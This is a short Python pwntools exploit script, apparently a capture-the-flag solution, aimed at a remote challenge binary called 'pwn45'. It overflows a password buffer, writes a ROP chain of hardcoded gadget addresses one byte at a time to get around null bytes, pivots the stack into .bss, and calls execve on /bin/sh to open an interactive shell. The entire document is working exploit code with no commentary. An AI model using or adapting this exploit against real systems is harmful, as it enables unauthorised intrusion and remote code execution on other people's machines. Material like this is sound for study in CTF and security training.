from pwn import *
context(log_level = 'debug', arch = 'amd64', terminal = ['tmux', 'splitw', '-h'])

# io = process('./pwn45')
io = remote("node1.anna.nssctf.cn", 28368)
elf = ELF("./pwn45")

read_sys = 0x448c8c
bss_addr = 0x6bb900
syscall = 0x4012bc

pop_rdi = 0x400706
pop_rsi = 0x410043
pop_rdx = 0x448c95
pop_rax = 0x4005af
pop_rbp = 0x400b18
leave_ret = 0x475b22


payload = p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss_addr) + p64(read_sys)
payload += p64(pop_rbp) + p64(bss_addr) + p64(leave_ret)


for i in range(len(payload)):
    tmp = bytearray(payload)
    for j in range(len(payload) - i):
        if payload[j] == 0:
            tmp[j] = 97
    io.sendafter(b"password:\n", b"a" * 0x108 + tmp)


io.sendafter(b"password:\n", b"PASSWORD")
payload = b"/bin/sh\x00" + p64(pop_rdi) + p64(bss_addr) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(59) + p64(syscall)
io.send(payload)

io.interactive()